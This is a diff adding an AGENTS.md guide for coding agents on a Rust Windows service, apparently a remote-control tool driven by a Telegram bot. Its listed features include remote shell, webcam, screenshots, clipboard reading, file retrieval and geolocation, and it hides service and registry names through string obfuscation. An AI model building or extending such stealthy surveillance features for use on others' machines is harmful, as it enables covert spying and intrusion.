@@ -1,0 +1,147 @@
+# AGENTS.md — Coding Agents Guide for tg-remote-bot
+
+## Project Overview
+
+A Windows remote-control agent that runs as a Windows Service and is controlled
+via Telegram Bot API using long polling. One machine = one bot token. Super user
+can send commands from any chat (DM, group).
+
+- **Language:** Rust (edition 2024)
+- **Target:** `x86_64-pc-windows-msvc` (Windows 10/11)
+- **Runtime:** tokio (full features)
+- **Bot framework:** teloxide 0.17 with macros
+- **Config:** dotenvy (`.env` file) → baked at compile time via `build.rs`
+- **Error handling:** anyhow
+
+## Build / Run / Test Commands
+
+```powershell
+# Config: create .env file
+echo "TG_BOT_TOKEN=your_token" > .env
+echo "TG_SUPER_USER_ID=your_id" >> .env
+
+# Build release
+cargo build --release
+
+# Build debug
+cargo build
+
+# Run in foreground (debug/test)
+cargo run -- --run
+
+# Install as Windows Service (requires admin)
+cargo run -- --install
+
+# Uninstall service
+cargo run -- --uninstall
+
+# Lint
+cargo clippy --all-targets -- -D warnings
+
+# Format
+cargo fmt --all
+
+# Format check
+cargo fmt --all -- --check
+
+# Run all tests
+cargo test
+
+# Run single test
+cargo test test_name_here
+
+# Check types
+cargo check
+```
+
+## Code Style Guidelines
+
+### Imports
+- Group: `std` → external crates → `crate::` modules, blank line between groups.
+- Prefer `use` over fully qualified paths.
+- No glob imports except in test modules.
+
+### Naming
+- Modules: `snake_case` (e.g., `rate_limit.rs`)
+- Types: `PascalCase` (e.g., `AgentState`, `RunningJob`)
+- Functions/vars: `snake_case` (e.g., `is_authorized`, `truncate_str`)
+- Constants: `SCREAMING_SNAKE_CASE` (e.g., `MUTEX_NAME`)
+- Telegram commands: match command name (e.g., `fn screenshot()`, `fn sysinfo()`)
+
+### Types & Patterns
+- `anyhow::Result` for fallible functions.
+- `Arc<Mutex<T>>` for shared mutable state (e.g., `ActiveJob`).
+- `Mutex<HashMap<&str, Bucket>>` for rate limiting.
+- Sensitive strings via `obfstr::obfstring!()` in `security/obfuscation.rs`.
+- Config: `.env` file → baked via `dotenvy` in `build.rs` → compiled into binary.
+- Uptime: stored as `Instant` in `AgentState.start_time`, computed via `start_time.elapsed()`.
+- String truncation: use `bot::truncate_str()` which respects UTF-8 char boundaries.
+
+### MarkdownV2
+- All messages use `ParseMode::MarkdownV2` via `md::send()`.
+- All dynamic content MUST be escaped via `md::escape()`.
+- Static content must have `.` `,` `(` `)` `!` `+` `-` escaped with `\`.
+
+### Formatting
+- No `.rustfmt.toml` — use defaults (4-space indent, 100 char width).
+- No comments unless explicitly asked.
+
+### Error Handling
+- Propagate with `?`; avoid `.unwrap()`.
+- Never panic in command handlers — return errors to user via Telegram.
+- Use `anyhow::Context` for adding context: `.context("describing what failed")?`
+
+### Async / Concurrency
+- `tokio::spawn` for detached tasks; `JoinHandle` stored in `ActiveJob` for `/cancel`.
+- Mutex lock must NOT be held across `.await` — extract value first, drop guard, then await.
+- Shell output truncated at 3800 bytes via `truncate_str()`.
+
+### Project Structure
+```
+src/
+├── main.rs           # CLI args, mutex check, admin check, SCM dispatch
+├── bot/
+│   ├── mod.rs        # AgentState, run_until() with retry loop, truncate_str()
+│   ├── auth.rs       # is_authorized()
+│   ├── md.rs         # MarkdownV2 escape(), send(), send_photo()
+│   ├── router.rs     # Command enum, all handler functions
+│   └── rate_limit.rs # Token bucket per-command rate limiter
+├── commands/
+│   ├── ping.rs       # PONG + IP + uptime + version
+│   ├── status.rs     # PID + uptime + job status
+│   ├── screenshot.rs # Screen capture → JPEG
+│   ├── shell.rs      # cmd /C execution + /cancel
+│   ├── sysinfo.rs    # CPU, RAM, disks, network
+│   ├── system.rs     # lock, shutdown, restart, abort, run
+│   ├── files.rs      # listfiles, getfile
+│   ├── procs.rs      # procs, kill
+│   ├── network.rs    # netstat (interface list)
+│   ├── clipboard.rs  # Read clipboard
+│   ├── location.rs   # IP geolocation
+│   ├── camera.rs     # Webcam capture
+│   ├── wallpaper.rs  # Get desktop wallpaper
+│   └── notify.rs     # Login watcher (stub)
+├── machine/
+│   ├── mod.rs
+│   └── identity.rs   # SHA256(hostname+MAC) machine ID (unused currently)
+├── security/
+│   ├── mod.rs
+│   ├── dpapi.rs      # CryptProtectData / CryptUnprotectData
+│   └── obfuscation.rs # obfstr! for service name, registry path
+├── service/
+│   ├── mod.rs
+│   ├── config.rs     # Baked env → registry fallback
+│   ├── install.rs    # SCM install/uninstall
+│   └── windows_svc.rs # define_windows_service! + SCM dispatch
+└── updater/
+    ├── mod.rs
+    └── self_update.rs # Download → verify → restart (stub)
+```
+
+### Mandatory Rules
+1. Only one instance per machine — enforced via named mutex (`CreateMutexA`).
+2. `/install` requires admin — checked via HKLM write access.
+3. Polling retry with exponential backoff on `TerminatedByOtherGetUpdates`.
+4. All commands reply to the specific message via `reply_parameters`.
+5. `AgentState` includes `agent_version = env!("CARGO_PKG_VERSION")` and `start_time: Instant`.
+6. No topic/group constraints — super user can command from anywhere.
